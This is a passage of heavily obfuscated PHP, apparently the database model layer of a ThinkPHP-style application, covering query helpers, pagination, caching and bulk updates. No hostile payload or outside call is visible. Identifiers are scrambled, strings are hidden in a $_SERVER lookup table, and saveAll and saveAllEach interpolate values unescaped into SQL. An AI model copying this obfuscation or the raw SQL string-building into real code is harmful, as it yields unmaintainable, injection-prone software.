$ÚÁ«Ã = explode($ŸÁ¨ëáœ[50], $ÚÁ«Ã); } $…âƒüé = $this->getDbFields(); $ÚÁ«Ã = $…âƒüé ? array_diff($…âƒüé, $ÚÁ«Ã) : $ÚÁ«Ã; } $this->options[$ŸÁ¨ëáœ[328]] = $ÚÁ«Ã; return $this; } public function scope($«ÉºÓÎ = '', $æ•¦½ö¨ = NULL) { $Ø‘â Âç =& $_SERVER[ú‡®¯¨±]; if ($Ø‘â Âç[12] === $«ÉºÓÎ) { if (isset($this->_scope[$Ø‘â Âç[37]])) { $•Öº‹éÂ = $this->_scope[$Ø‘â Âç[37]]; } else { return $this; } } elseif (is_string($«ÉºÓÎ)) { $ËÔúñâ‡ = explode($Ø‘â Âç[50], $«ÉºÓÎ); $•Öº‹éÂ = array(); foreach ($ËÔúñâ‡ as $ÜèİÁÂ‡) { if (!isset($this->_scope[$ÜèİÁÂ‡])) { continue; } $•Öº‹éÂ = array_merge($•Öº‹éÂ, $this->_scope[$ÜèİÁÂ‡]); } if (!empty($æ•¦½ö¨) && is_array($æ•¦½ö¨)) { $•Öº‹éÂ = array_merge($•Öº‹éÂ, $æ•¦½ö¨); } } elseif (is_array($«ÉºÓÎ)) { $•Öº‹éÂ = $«ÉºÓÎ; } if (is_array($•Öº‹éÂ) && !empty($•Öº‹éÂ)) { $this->options = array_merge($this->options, array_change_key_case($•Öº‹éÂ)); } return $this; } public function where($£ò´ÌÑ•, $ãÑöºÑú = null) { $şÇ¡æé =& $_SERVER[ú‡®¯¨±]; if (!is_null($ãÑöºÑú) && is_string($£ò´ÌÑ•)) { if (!is_array($ãÑöºÑú)) { $ãÑöºÑú = func_get_args(); array_shift($ãÑöºÑú); } $ãÑöºÑú = array_map(array($this->db, $şÇ¡æé[398]), $ãÑöºÑú); $£ò´ÌÑ• = vsprintf($£ò´ÌÑ•, $ãÑöºÑú); } elseif (is_object($£ò´ÌÑ•)) { $£ò´ÌÑ• = get_object_vars($£ò´ÌÑ•); } elseif (is_array($£ò´ÌÑ•)) { foreach ($£ò´ÌÑ• as $¢¹…§ºŸ => $ıú¡®¦Ú) { if ((is_numeric($¢¹…§ºŸ) || !$¢¹…§ºŸ) && is_string($ıú¡®¦Ú)) { if (strpos($ıú¡®¦Ú, $şÇ¡æé[405]) === 0) { continue; } think_trace($şÇ¡æé[406], $şÇ¡æé[12], $şÇ¡æé[49]); die; } } } if (is_string($£ò´ÌÑ•) && $şÇ¡æé[12] != $£ò´ÌÑ•) { $¥‡šÃÒÈ = array(); $¥‡šÃÒÈ[$şÇ¡æé[407]] = $£ò´ÌÑ•; $£ò´ÌÑ• = $¥‡šÃÒÈ; } if (isset($this->options[$şÇ¡æé[330]])) { $this->options[$şÇ¡æé[330]] = array_merge($this->options[$şÇ¡æé[330]], $£ò´ÌÑ•); } else { $this->options[$şÇ¡æé[330]] = $£ò´ÌÑ•; } return $this; } public function limit($ÅëìÌı“, $Œûü„éî = null) { $™¿…íµğ =& $_SERVER[ú‡®¯¨±]; $this->options[$™¿…íµğ[347]] = is_null($Œûü„éî) ? $ÅëìÌı“ : $ÅëìÌı“ . $™¿…íµğ[50] . $Œûü„éî; return $this; } public function page($üÜ’›ÒŞ, $©¹Äêî = null) { $ƒı¸¯ =& $_SERVER[ú‡®¯¨±]; $this->options[$ƒı¸¯[408]] = is_null($©¹Äêî) ? $üÜ’›ÒŞ : $üÜ’›ÒŞ . $ƒı¸¯[50] . $©¹Äêî; return $this; } public function comment($™¿áª´É) { $this->options[$_SERVER[ú‡®¯¨±][409]] = $™¿áª´É; return $this; } public function setProperty($ÓÀÂš½, $á€èøºû) { if (property_exists($this, $ÓÀÂš½)) { $this->{$ÓÀÂš½} = $á€èøºû; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\x54\x69\x6d\x65", "\164\151\155\145", "\x69\156\x73\145\x72\x74\54\165\160\x64\141\164\x65", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\x63\162\x65\141\164\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\146\165\x6e\143\164\151\157\156")); public function setDataAuto($ääÙÂüª) { $this->dataAuto = $ääÙÂüª; } public function __construct($ğ¾ÍÆ· = '', $İ¶¯š½µ = '', $çä”¬ = '') { parent::__construct($ğ¾ÍÆ·, $İ¶¯š½µ, $çä”¬); } protected $tableMeta = array(); protected function _beforeInsert(&$ÎÈ‚Éƒ, $”ôüÕÔÕ) { $ÀĞÅœõ =& $_SERVER[ú‡®¯¨±]; if (!$this->checkDataAutoHas($ÀĞÅœõ[410])) { return; } $this->dataBeforeFilter($ÎÈ‚Éƒ, $ÀĞÅœõ[410]); } protected function _beforeUpdate(&$éªÚõÁ‡, $é®§×™Ù) { $æ·çÃÅª =& $_SERVER[ú‡®¯¨±]; if (!$this->checkDataAutoHas($æ·çÃÅª[411])) { return; } $this->dataBeforeFilter($éªÚõÁ‡, $æ·çÃÅª[411]); } protected function _afterSelect(&$ê¨ÎŒÊö, $§À½Ú¦) { if (!is_array($ê¨ÎŒÊö)) { return; } if (!$this->checkDataAutoHas($_SERVER[ú‡®¯¨±][412])) { return; } foreach ($ê¨ÎŒÊö as &$ÎšÅ§½Ä) { $this->dataAfterFilter($ÎšÅ§½Ä); } unset($ÎšÅ§½Ä); } protected function _afterFind(&$¦ Œ­õ®, $§±Íã¾) { if (!is_array($¦ Œ­õ®)) { return; } if (!$this->checkDataAutoHas($_SERVER[ú‡®¯¨±][412])) { return; } $this->dataAfterFilter($¦ Œ­õ®); } public static function textEncode($¥ë°œÂÖ) { if (!$¥ë°œÂÖ) { return $¥ë°œÂÖ; } $”„ó¿ = json_encode($¥ë°œÂÖ); $”„ó¿ = preg_replace_callback($_SERVER[ú‡®¯¨±][413], function ($êåäÓ®) { return addslashes($êåäÓ®[0]); }, $”„ó¿); return json_decode($”„ó¿); } public static function textDecode($•ıªö©º) { $ı©¹”™ =& $_SERVER[ú‡®¯¨±]; $ø»êí¦ï = json_encode($•ıªö©º); $ø»êí¦ï = preg_replace_callback($ı©¹”™[414], function ($Š’ş‘´ô) { return $_SERVER[ú‡®¯¨±][99]; }, $ø»êí¦ï); return json_decode($ø»êí¦ï); } public function setAutoIncrement($”®„ı²) { $¯ ’îæ± = array($this->getPk() => $”®„ı²); $ù¸İ‡ğ = $this->data($¯ ’îæ±)->add(); if ($ù¸İ‡ğ) { $this->delete($ù¸İ‡ğ); } } public function getAutoIncrement() { $‰ùÍŸè  = $this->getTableName(); $»”¬–¿Û = $this->max($this->getPk()); $³¨à…Íö = $this->query("\163\150\x6f\167\40\164\x61\x62\154\x65\x20\163\164\141\x74\x75\163\40\x77\150\x65\x72\x65\40\116\x61\155\145\x3d\47{$‰ùÍŸè }\47"); $²‰­ßéÈ = $³¨à…Íö[0][$_SERVER[ú‡®¯¨±][415]]; $„½öçà = max($»”¬–¿Û, $²‰­ßéÈ); return $„½öçà; } protected function _callBefore($Ö¨•À»¯, $à§ïÌ¸ß) { return $this->cacheCallCheck($Ö¨•À»¯, $à§ïÌ¸ß, !1); } protected function _callAfter($ößˆ…ÍÎ, $ˆ…¼õ°) { return $this->cacheCallCheck($ößˆ…ÍÎ, $ˆ…¼õ°, !0); } protected function cacheFunctionAlias($Í¢÷Ú) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($°íï›‘Ó, $Åà¡à½Í, $‰Õ“Ÿ¢¿ = false) { $˜Ê„ÖÒ  = $this->cacheFunctionAlias($Åà¡à½Í); if (!$˜Ê„ÖÒ ) { return; } foreach ($˜Ê„ÖÒ  as $üŠ¸Ü => $¨îºš½) { $º²·ÍÆü = $¨îºš½[0]; $ÄÆşòÃ‘ = explode($_SERVER[ú‡®¯¨±][50], $¨îºš½[1]); if ($°íï›‘Ó == $üŠ¸Ü) { return $this->cacheFunctionGet($üŠ¸Ü, $º²·ÍÆü); } if ($‰Õ“Ÿ¢¿ && in_array($°íï›‘Ó, $ÄÆşòÃ‘)) { $this->cacheFunctionClear($üŠ¸Ü, $º²·ÍÆü); } } } public function cacheFunctionGet($ĞğŠˆˆ—, $òÌš×›º) { $œÊŒ¯èÜ = $this->cacheKeyMake($ĞğŠˆˆ—, $òÌš×›º); $¨ÀÒÊô = Cache::get($œÊŒ¯èÜ); if (!is_array($¨ÀÒÊô)) { $¨ÀÒÊô = call_user_func_array(array($this, $ĞğŠˆˆ—), array($òÌš×›º, !0)); Cache::set($œÊŒ¯èÜ, $¨ÀÒÊô); } return $¨ÀÒÊô; } public function cacheFunctionClear($î›Ğ¶Â, $èş®íš) { $§ƒÌØí® = $èş®íš; if (!is_array($èş®íš)) { $§ƒÌØí® = array($èş®íš); } foreach ($§ƒÌØí® as $ø½è¶Ëœ) { $µŞŸ†›ƒ = $this->cacheKeyMake($î›Ğ¶Â, $ø½è¶Ëœ); Cache::remove($µŞŸ†›ƒ); } } private function cacheKeyMake($Ê½æ ÒĞ, $ÕÍ×ê”ò) { $õÌ§œª =& $_SERVER[ú‡®¯¨±]; return get_class($this) . $õÌ§œª[11] . $Ê½æ ÒĞ . $õÌ§œª[416] . $ÕÍ×ê”ò; } protected function selectPageReset() { $‹µÓ¡ÙÅ =& $_SERVER[ú‡®¯¨±]; if (isset($GLOBALS[$‹µÓ¡ÙÅ[417]])) { return; } $GLOBALS[$‹µÓ¡ÙÅ[417]] = isset($GLOBALS[$‹µÓ¡ÙÅ[7]][$‹µÓ¡ÙÅ[418]]) ? $GLOBALS[$‹µÓ¡ÙÅ[7]][$‹µÓ¡ÙÅ[418]] : !1; $GLOBALS[$‹µÓ¡ÙÅ[419]] = isset($GLOBALS[$‹µÓ¡ÙÅ[7]][$‹µÓ¡ÙÅ[408]]) ? $GLOBALS[$‹µÓ¡ÙÅ[7]][$‹µÓ¡ÙÅ[408]] : !1; $GLOBALS[$‹µÓ¡ÙÅ[7]][$‹µÓ¡ÙÅ[418]] = !1; $GLOBALS[$‹µÓ¡ÙÅ[7]][$‹µÓ¡ÙÅ[408]] = !1; } protected function selectPageRestore() { $ƒøÌÌç =& $_SERVER[ú‡®¯¨±]; if (!isset($GLOBALS[$ƒøÌÌç[417]])) { return; } $GLOBALS[$ƒøÌÌç[7]][$ƒøÌÌç[418]] = $GLOBALS[$ƒøÌÌç[417]]; $GLOBALS[$ƒøÌÌç[7]][$ƒøÌÌç[408]] = $GLOBALS[$ƒøÌÌç[419]]; if ($GLOBALS[$ƒøÌÌç[7]][$ƒøÌÌç[418]] === !1) { unset($GLOBALS[$ƒøÌÌç[7]][$ƒøÌÌç[418]]); } if ($GLOBALS[$ƒøÌÌç[7]][$ƒøÌÌç[408]] === !1) { unset($GLOBALS[$ƒøÌÌç[7]][$ƒøÌÌç[408]]); } unset($GLOBALS[$ƒøÌÌç[417]]); unset($GLOBALS[$ƒøÌÌç[419]]); } protected function selectPage($áÑ“Âèƒ = 200, $»“Ì’›¾ = 1) { $ù…ÏŒÒí =& $_SERVER[ú‡®¯¨±]; global $in; $·Æç« = $this->optionsValue(); $ÀÊ¡¤Æ‹ = 50000; $áÑ“Âèƒ = isset($in[$ù…ÏŒÒí[418]]) && $in[$ù…ÏŒÒí[418]] ? $in[$ù…ÏŒÒí[418]] : $áÑ“Âèƒ; if ($áÑ“Âèƒ === -1) { $in[$ù…ÏŒÒí[418]] = !1; $ÀÊ¡¤Æ‹ = 100000000; $áÑ“Âèƒ = $ÀÊ¡¤Æ‹; } $ñ¸ö¤· = $·Æç«; $ñ¸ö¤·[$ù…ÏŒÒí[420]] = array(); $áÑ“Âèƒ = intval($áÑ“Âèƒ); $áÑ“Âèƒ = $áÑ“Âèƒ <= 5 ? 5 : ($áÑ“Âèƒ >= $ÀÊ¡¤Æ‹ ? $ÀÊ¡¤Æ‹ : $áÑ“Âèƒ); $»“Ì’›¾ = intval(isset($in[$ù…ÏŒÒí[408]]) && $in[$ù…ÏŒÒí[408]] ? $in[$ù…ÏŒÒí[408]] : $»“Ì’›¾); $»“Ì’›¾ = $»“Ì’›¾ <= 1 ? 1 : $»“Ì’›¾; $•ö³¤½Ù = array(); $×ÑıôÓ¨ = 1; if ($»“Ì’›¾ == 1 && $×ÑıôÓ¨) { $this->optionsValue($·Æç«); $•ö³¤½Ù = $this->page($»“Ì’›¾, $áÑ“Âèƒ)->select(); $Ü¸‰Ëğ = is_array($•ö³¤½Ù) ? count($•ö³¤½Ù) : 0; if ($Ü¸‰Ëğ < $áÑ“Âèƒ) { $úÆµÂı = 1; } else { $this->optionsValue($ñ¸ö¤·); $Ü¸‰Ëğ = intval($this->count()); $úÆµÂı = ceil($Ü¸‰Ëğ / $áÑ“Âèƒ); } } else { $this->optionsValue($ñ¸ö¤·); $Ü¸‰Ëğ = intval($this->count()); $úÆµÂı = ceil($Ü¸‰Ëğ / $áÑ“Âèƒ); $»“Ì’›¾ = $»“Ì’›¾ >= $úÆµÂı ? $úÆµÂı : $»“Ì’›¾; $this->optionsValue($·Æç«); $•ö³¤½Ù = $this->page($»“Ì’›¾, $áÑ“Âèƒ)->select(); } if (!is_array($•ö³¤½Ù)) { $•ö³¤½Ù = array(); } if ($úÆµÂı == 1) { $Ü¸‰Ëğ = count($•ö³¤½Ù); } $’ƒıÙ›ß = array($ù…ÏŒÒí[421] => array($ù…ÏŒÒí[422] => $Ü¸‰Ëğ, $ù…ÏŒÒí[418] => $áÑ“Âèƒ, $ù…ÏŒÒí[408] => $»“Ì’›¾, $ù…ÏŒÒí[423] => $úÆµÂı), $ù…ÏŒÒí[424] => $•ö³¤½Ù); return $’ƒıÙ›ß; } protected function checkLength($¥èåµ×, $›ÈÙÖÚ‡ = 0, $â‡ÕãòÊ = '') { $òÆ‚Í®ê =& $_SERVER[ú‡®¯¨±]; $›ÈÙÖÚ‡ = $›ÈÙÖÚ‡ ? $›ÈÙÖÚ‡ : 65536; if (!$¥èåµ× || strlen($¥èåµ×) < $›ÈÙÖÚ‡) { return; } $â‡ÕãòÊ = $â‡ÕãòÊ ? $â‡ÕãòÊ . $òÆ‚Í®ê[73] : $òÆ‚Í®ê[12]; show_json($â‡ÕãòÊ . LNG($òÆ‚Í®ê[425]) . "\50{$›ÈÙÖÚ‡}\x29", !1); } protected function metaSet($ ’ü¢¡‹, $“ÊßŞ¦˜ = null, $Ší¡û• = null) { $†Î²Úî =& $_SERVER[ú‡®¯¨±]; if (!$this->tableMeta || !$ ’ü¢¡‹) { return !1; } $‹ÊîŠ€´ = $this->tableMeta[$†Î²Úî[426]]; $µÅÌ¶£´ = $this->tableMeta[$†Î²Úî[427]]; $ƒÀ©µ­¿ = Model($µÅÌ¶£´); $ıâÜî“Ú = array($‹ÊîŠ€´ => $ ’ü¢¡‹, $†Î²Úî[428] => $“ÊßŞ¦˜); if (is_null($“ÊßŞ¦˜)) { return $ƒÀ©µ­¿->where(array($‹ÊîŠ€´ => $ ’ü¢¡‹))->delete(); } if (is_null($Ší¡û•) && is_string($“ÊßŞ¦˜)) { return $ƒÀ©µ­¿->where($ıâÜî“Ú)->delete(); } $§ş¾‘”” = is_array($“ÊßŞ¦˜) ? $“ÊßŞ¦˜ : array(); if (is_string($“ÊßŞ¦˜)) { $§ş¾‘””[$“ÊßŞ¦˜] = $Ší¡û•; } $ƒÒÚà§² = array(); foreach ($§ş¾‘”” as $„ÙÕâõ° => $‘“‚§ÔÇ) { if (is_null($‘“‚§ÔÇ) && is_string($„ÙÕâõ°)) { $ƒÀ©µ­¿->where(array($‹ÊîŠ€´ => $ ’ü¢¡‹, $†Î²Úî[428] => $„ÙÕâõ°))->delete(); continue; } $this->checkLength($‘“‚§ÔÇ, !1, $µÅÌ¶£´ . $†Î²Úî[4] . $„ÙÕâõ°); $ƒÒÚà§²[] = array($‹ÊîŠ€´ => $ ’ü¢¡‹, $†Î²Úî[96] => $„ÙÕâõ°, $†Î²Úî[429] => $‘“‚§ÔÇ); } $¥øÁÆªõ = $†Î²Úî[430] . $µÅÌ¶£´; CacheLock::lock($¥øÁÆªõ); $ƒÀ©µ­¿->where(array($‹ÊîŠ€´ => $ ’ü¢¡‹))->addAll($ƒÒÚà§², array(), !0); CacheLock::unlock($¥øÁÆªõ); return !0; } public function metaGet($·´Ì³ß¬, $›ºœßÁç = false) { $ËÍÁƒŠ² =& $_SERVER[ú‡®¯¨±]; if (!$this->tableMeta) { return array(); } $×èêçş = $this->tableMeta[$ËÍÁƒŠ²[426]]; $¡ñáìÈ = Model($this->tableMeta[$ËÍÁƒŠ²[427]]); if ($›ºœßÁç) { $ıÁ¨ßÆ² = array($×èêçş => $·´Ì³ß¬, $ËÍÁƒŠ²[96] => $›ºœßÁç); return $¡ñáìÈ->where($ıÁ¨ßÆ²)->getField($ËÍÁƒŠ²[429]); } $ıÁ¨ßÆ² = array($×èêçş => $·´Ì³ß¬); $—À’´›× = $¡ñáìÈ->field($ËÍÁƒŠ²[431])->where($ıÁ¨ßÆ²)->select(); $—À’´›× = array_to_keyvalue($—À’´›×, $ËÍÁƒŠ²[96], $ËÍÁƒŠ²[429]); return $—À’´›×; } private function checkDataAutoHas($µà£Ç) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¬‰²ëÈ®) { if (in_array($µà£Ç, explode($_SERVER[ú‡®¯¨±][50], $¬‰²ëÈ®[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$šá³’´Û, $÷›æò€«) { $üÈ¶Í‹Ü =& $_SERVER[ú‡®¯¨±]; if (!is_array($šá³’´Û)) { return; } foreach ($this->dataAuto as $üË¬”…¢) { $Œ®úÌÉÑ = $üË¬”…¢[0]; if (!in_array($÷›æò€«, explode($üÈ¶Í‹Ü[50], $üË¬”…¢[2]))) { continue; } switch (trim($üË¬”…¢[3])) { case $üÈ¶Í‹Ü[376]: case $üÈ¶Í‹Ü[377]: $Í²”Á„ú = $üË¬”…¢[1]; $ºÚèÇİÎ = isset($üË¬”…¢[4]) ? (array) $üË¬”…¢[4] : array(); if ($Í²”Á„ú == $üÈ¶Í‹Ü[196] && array_key_exists($Œ®úÌÉÑ, $šá³’´Û)) { if (!$šá³’´Û[$Œ®úÌÉÑ]) { unset($šá³’´Û[$Œ®úÌÉÑ]); } break; } if (isset($šá³’´Û[$Œ®úÌÉÑ])) { array_unshift($ºÚèÇİÎ, $šá³’´Û[$Œ®úÌÉÑ]); } if ($üÈ¶Í‹Ü[376] == $üË¬”…¢[3]) { $šá³’´Û[$Œ®úÌÉÑ] = call_user_func_array($Í²”Á„ú, $ºÚèÇİÎ); } else { $šá³’´Û[$Œ®úÌÉÑ] = call_user_func_array(array(&$this, $Í²”Á„ú), $ºÚèÇİÎ); } break; case $üÈ¶Í‹Ü[325]: if (isset($šá³’´Û[$Œ®úÌÉÑ]) && $šá³’´Û[$Œ®úÌÉÑ]) { $šá³’´Û[$Œ®úÌÉÑ] = call_user_func_array(array(&$this, $üË¬”…¢[1]), array($šá³’´Û[$Œ®úÌÉÑ])); } break; case $üÈ¶Í‹Ü[328]: $šá³’´Û[$Œ®úÌÉÑ] = $šá³’´Û[$üË¬”…¢[1]]; break; case $üÈ¶Í‹Ü[349]: if (isset($šá³’´Û[$Œ®úÌÉÑ]) && !is_string($šá³’´Û[$Œ®úÌÉÑ])) { $šá³’´Û[$Œ®úÌÉÑ] = json_encode_force($šá³’´Û[$Œ®úÌÉÑ]); } break; case $üÈ¶Í‹Ü[378]: if ($šá³’´Û[$Œ®úÌÉÑ] === $üÈ¶Í‹Ü[12]) { unset($šá³’´Û[$Œ®úÌÉÑ]); } break; case $üÈ¶Í‹Ü[379]: $šá³’´Û[$Œ®úÌÉÑ] = $üË¬”…¢[1]; default: break; } } if ($÷›æò€« == $üÈ¶Í‹Ü[410]) { $—ó­’»¸ = strtolower($this->db->getDbType()); if (strpos($—ó­’»¸, $üÈ¶Í‹Ü[13]) !== 0) { return; } $¾šË…å± = $this->field(!0)->fields; $å¤šãú = $¾šË…å±[$üÈ¶Í‹Ü[307]]; if (isset($¾šË…å±[$üÈ¶Í‹Ü[306]])) { unset($å¤šãú[$¾šË…å±[$üÈ¶Í‹Ü[306]]]); } foreach ($å¤šãú as $¨ë‡èñ­ => $÷›æò€«) { if (!isset($šá³’´Û[$¨ë‡èñ­])) { $šá³’´Û[$¨ë‡èñ­] = $üÈ¶Í‹Ü[12]; } } } } private function dataAfterFilter(&$ÄàğÉß) { $§œç“´ö =& $_SERVER[ú‡®¯¨±]; foreach ($this->dataAuto as $Ìâïû) { $†²Ş…èé = $Ìâïû[0]; if (!isset($ÄàğÉß[$†²Ş…èé])) { continue; } if (!in_array($§œç“´ö[412], explode($§œç“´ö[50], $Ìâïû[2]))) { continue; } switch (trim($Ìâïû[3])) { case $§œç“´ö[376]: case $§œç“´ö[377]: $ğ—†ğ¤„ = isset($Ìâïû[4]) ? (array) $Ìâïû[4] : array(); array_unshift($ğ—†ğ¤„, $ÄàğÉß[$†²Ş…èé]); if (isset($Ìâïû[4]) && $Ìâïû[4] == $§œç“´ö[432]) { $ğ—†ğ¤„ = array($ÄàğÉß[$†²Ş…èé]); } if ($§œç“´ö[376] == $Ìâïû[3]) { $ÄàğÉß[$†²Ş…èé] = call_user_func_array($Ìâïû[1], $ğ—†ğ¤„); } else { $ÄàğÉß[$†²Ş…èé] = call_user_func_array(array(&$this, $Ìâïû[1]), $ğ—†ğ¤„); } break; case $§œç“´ö[325]: if (isset($ÄàğÉß[$†²Ş…èé]) && $ÄàğÉß[$†²Ş…èé]) { $ÄàğÉß[$†²Ş…èé] = call_user_func_array(array(&$this, $Ìâïû[1]), array($ÄàğÉß[$†²Ş…èé])); } break; case $§œç“´ö[328]: $ÄàğÉß[$†²Ş…èé] = $ÄàğÉß[$Ìâïû[1]]; break; case $§œç“´ö[349]: $ÅÚ¹ôĞ­ = $ÄàğÉß[$†²Ş…èé]; $ÄàğÉß[$†²Ş…èé] = json_decode($ÅÚ¹ôĞ­, !0); if (is_null($ÄàğÉß[$†²Ş…èé])) { $ÄàğÉß[$†²Ş…èé] = $ÅÚ¹ôĞ­; } break; case $§œç“´ö[378]: if ($ÄàğÉß[$†²Ş…èé] === $§œç“´ö[12]) { unset($ÄàğÉß[$†²Ş…èé]); } break; case $§œç“´ö[379]: $ÄàğÉß[$†²Ş…èé] = $Ìâïû[1]; break; default: break; } } } public function saveAll($¨Ëç’ÓÛ) { $ÊÅØ–ôğ =& $_SERVER[ú‡®¯¨±]; $ªç¸†ı‹ = $this->tablePrefix . $this->tableName; $ÚëŒ”•½ = self::SQL_WHERE_IN_CHUNK; $¨Ëç’ÓÛ = is_array($¨Ëç’ÓÛ) ? $¨Ëç’ÓÛ : array(); $ûê¡œ = $ÊÅØ–ôğ[211]; $ê…ÑûÀ˜ = 0; $˜µˆ¾† = array(); $î¥àí‰Ê = count($¨Ëç’ÓÛ); for ($›ç‡Ç‹ = 0; $›ç‡Ç‹ < $î¥àí‰Ê; $›ç‡Ç‹++) { $ËóŒŸ°ß = $¨Ëç’ÓÛ[$›ç‡Ç‹]; if (!is_array($ËóŒŸ°ß) || count($ËóŒŸ°ß) != 4) { continue; } $üÛä¨îª = "\x55\x50\104\101\x54\x45\x20\x60{$ªç¸†ı‹}\x60\40\x53\x45\x54\x20{$ËóŒŸ°ß[2]}\x20\x3d\x20\103\101\x53\105\40{$ËóŒŸ°ß[0]}\x20\12"; if ($ê…ÑûÀ˜ == 0) { $ûê¡œ = $üÛä¨îª; } $˜µˆ¾†[] = $ÊÅØ–ôğ[120] . $ËóŒŸ°ß[1] . $ÊÅØ–ôğ[120]; $ê…ÑûÀ˜++; $ûê¡œ .= "\x20\127\x48\x45\116\40\47{$ËóŒŸ°ß[1]}\x27\40\x54\110\x45\116\40\x27{$ËóŒŸ°ß[3]}\47\40\12"; if ($ê…ÑûÀ˜ == $ÚëŒ”•½ || $›ç‡Ç‹ == $î¥àí‰Ê - 1) { $å¨®èÑ = implode($ÊÅØ–ôğ[50], $˜µˆ¾†); $ûê¡œ .= "\40\105\116\x44\40\x20\127\110\x45\122\x45\40{$ËóŒŸ°ß[0]}\40\x49\116\x20\x28{$å¨®èÑ}\51\40"; $this->execute($ûê¡œ); $ê…ÑûÀ˜ = 0; $ûê¡œ = $üÛä¨îª; $this->chunkEventCheck(count($˜µˆ¾†)); $˜µˆ¾† = array(); } } $this->chunkEventSet(); } public function saveAllEach($©›‹‹¥µ) { $ºÆ¤Äî‹ =& $_SERVER[ú‡®¯¨±]; $Ê‰ı¢ = $this->tablePrefix . $this->tableName; foreach ($©›‹‹¥µ as $ªµŸ™ü¬) { if (!is_array($ªµŸ™ü¬) || count($ªµŸ™ü¬) != 4) { continue; } $¾œ†ŸÄ = $ªµŸ™ü¬[0] . $ºÆ¤Äî‹[433] . $ªµŸ™ü¬[1] . $ºÆ¤Äî‹[120]; $èÓ­ëÀ© = $ªµŸ™ü¬[2] . $ºÆ¤Äî‹[433] . $ªµŸ™ü¬[3] . $ºÆ¤Äî‹[120]; $º¸²ßÑ‰ = "\x75\x70\144\x61\x74\145\40{$Ê‰ı¢}\x20\x73\x65\164\40{$èÓ­ëÀ©}\x20\167\x68\x65\x72\145\x20{$¾œ†ŸÄ}\73"; $this->execute($º¸²ßÑ‰); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ª£’Ïó¿ = false, $Œ½ÍÒ¨² = false) { $this->_chunkEvent = $ª£’Ïó¿; $this->_chunkEventParam = $Œ½ÍÒ¨²; } private function chunkEventCheck($í‰ô˜ºº) { if (!$this->_chunkEvent) { return; } $àÅ²Š´ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $àÅ²Š´[$_SERVER[ú‡®¯¨±][434]] = $í‰ô˜ºº; Hook::trigger($this->_chunkEvent, $àÅ²Š´); } public function addAll($”´Ş¡šâ, $ãŒó‚Ü = array(), $¥Êœğ•Ä = false) { $¦¿Äàü® =& $_SERVER[ú‡®¯¨±]; ignore_timeout(); $‚™¨Ãûê = self::SQL_WHERE_IN_CHUNK; if (empty($”´Ş¡šâ)) { $this->error = think_lang($¦¿Äàü®[326]); return !1; } $ãŒó‚Ü = $this->_parseOptions($ãŒó‚Ü); foreach ($”´Ş¡šâ as $ãĞ”ª… => $×‰øÇ‚û) { $”´Ş¡šâ[$ãĞ”ª…] = $this->_facade($×‰øÇ‚û); $this->_beforeInsert($”´Ş¡šâ[$ãĞ”ª…], $ãŒó‚Ü); } if (method_exists($this->db, $¦¿Äàü®[327])) { for ($†‘Éêêô = 0; $†‘Éêêô < count($”´Ş¡šâ); $†‘Éêêô += $‚™¨Ãûê) { $È²‡Òèñ = array_slice($”´Ş¡šâ, $†‘Éêêô, $‚™¨Ãûê); if (!is_array($È²‡Òèñ) || count($È²‡Òèñ) == 0) { break; } $’ÏÂªİ§ = $this->db->insertAll($È²‡Òèñ, $ãŒó‚Ü, $¥Êœğ•Ä); $this->chunkEventCheck(count($È²‡Òèñ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($”´Ş¡šâ as $ãĞ”ª… => $×‰øÇ‚û) { $’ÏÂªİ§ = $this->db->insert($×‰øÇ‚û, $ãŒó‚Ü, $¥Êœğ•Ä); } $this->commit(); } if (!1 !== $’ÏÂªİ§) { $»İæ†ÄÊ = $this->getLastInsID(); if ($»İæ†ÄÊ) { return $»İæ†ÄÊ; } } return $’ÏÂªİ§; } public function save($¬Œâéªì = '', $„Ö¾ßÑÙ = array()) { $ÚĞÎ¸ˆŞ =& $_SERVER[ú‡®¯¨±]; $ù÷ß¢»ù = self::SQL_WHERE_IN_CHUNK; $ƒÙõé€¤ = $this->optionsValue(); $Öé¤óÃñ = $this->findWhereField($ƒÙõé€¤); if (!$Öé¤óÃñ) { return parent::save($¬Œâéªì, $„Ö¾ßÑÙ); } $Ïò÷¤Ç© = 0; $Ö´øúî¢ = $ƒÙõé€¤[$ÚĞÎ¸ˆŞ[330]][$Öé¤óÃñ][1]; $Ö´øúî¢ = is_array($Ö´øúî¢) ? $Ö´øúî¢ : array(); $‘ˆ‚õşÂ = count($Ö´øúî¢); for ($²ª”¦© = 0; $²ª”¦© < $‘ˆ‚õşÂ; $²ª”¦© += $ù÷ß¢»ù) { $šÌÒäŒ« = array_slice($Ö´øúî¢, $²ª”¦©, $ù÷ß¢»ù); if (!is_array($šÌÒäŒ«) || count($šÌÒäŒ«) == 0) { break; } $ƒÙõé€¤[$ÚĞÎ¸ˆŞ[330]][$Öé¤óÃñ][1] = $šÌÒäŒ«; $this->optionsValue($ƒÙõé€¤); $Ïò÷¤Ç© += parent::save($¬Œâéªì, $„Ö¾ßÑÙ); $this->chunkEventCheck(count($šÌÒäŒ«)); } $this->chunkEventSet(); return $Ïò÷¤Ç©; } public function add($¬²åãŞå = '', $¬ğßÃú = array(), $İáÉ¹ï = false) { if ($this->addTaskStatus && is_array($¬²åãŞå)) { $this->addTaskData[] = $¬²åãŞå; return; } return parent::add($¬²åãŞå, $¬ğßÃú, $İáÉ¹ï); } public function parseWhereLike($¿ŠÒâ±ó, $Èú¡È£ì = '', $Ìõ¥—áˆ = false, &$ªë·âùş = false) { $’µ…ºİ¡ =& $_SERVER[ú‡®¯¨±]; $·¿–ïÇÙ = $GLOBALS[$’µ…ºİ¡[6]][$’µ…ºİ¡[435]]; if (!$·¿–ïÇÙ[$’µ…ºİ¡[436]]) { return $¿ŠÒâ±ó; } if (!is_array($¿ŠÒâ±ó)) { return $¿ŠÒâ±ó; } $áÊ•Ôî» = array(); $ï‹®Ú¯ = 0; foreach ($¿ŠÒâ±ó as $ñÚ…ÎÒ¶ => $ïó½é›æ) { if 